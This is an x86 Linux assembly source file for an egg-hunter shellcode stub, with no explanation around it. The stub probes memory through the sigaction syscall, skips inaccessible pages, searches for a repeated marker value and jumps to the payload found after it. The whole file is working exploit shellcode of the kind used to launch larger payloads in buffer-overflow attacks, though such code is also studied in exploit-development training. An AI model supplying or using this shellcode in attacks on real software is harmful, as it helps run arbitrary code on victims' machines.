global _start

section .text

; clear ecx
_start:
	xor ecx, ecx
	jmp short next_address

; enumerate pages
next_page:
	or cx, 0x0fff

; enumerate addresses in page
next_address:
	inc ecx
	push byte +0x43
	pop eax
	int 0x80

; determine if we can access page
	cmp al,0xf2
	jz next_page

; check if we found egg
	mov eax,0x50905090
	mov edi,ecx
	scasd
	jnz next_address
	scasd
	jnz next_address
	jmp edi
